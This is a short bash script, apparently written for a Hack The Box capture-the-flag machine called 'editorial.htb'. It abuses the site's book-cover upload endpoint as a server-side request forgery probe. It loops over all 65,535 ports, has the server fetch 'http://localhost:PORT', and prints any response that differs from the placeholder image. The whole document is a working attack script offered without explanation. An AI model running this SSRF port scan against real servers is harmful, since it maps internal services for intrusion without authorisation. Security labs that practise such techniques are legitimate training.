#!/bin/bash

PLACEHOLDER="/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg"  # whatever the placeholder path is

for port in $(seq 0 65535); do
    response=$(curl -s -m 2 -i -X POST http://editorial.htb/upload-cover \
        -F "bookurl=http://localhost:${port}" \
        -F "bookfile=;filename=" \
        2>/dev/null)

    if [[ "$response" != *"$PLACEHOLDER"* ]]; then
        echo "[+] Port $port — unexpected response:"
        echo "$response"
        echo "---"
    fi
done